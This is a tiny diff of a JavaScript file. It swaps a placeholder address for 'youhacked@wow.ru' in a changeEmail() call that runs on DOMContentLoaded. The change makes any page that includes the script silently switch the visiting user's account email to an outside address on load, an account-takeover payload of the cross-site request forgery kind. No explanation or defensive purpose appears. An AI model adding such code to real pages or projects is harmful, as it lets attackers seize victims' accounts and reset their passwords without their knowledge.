@@ -49,5 +49,5 @@ function changeEmail(newEmail) {
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  changeEmail('your_safe_email@example.com');
+  changeEmail('youhacked@wow.ru');
 });
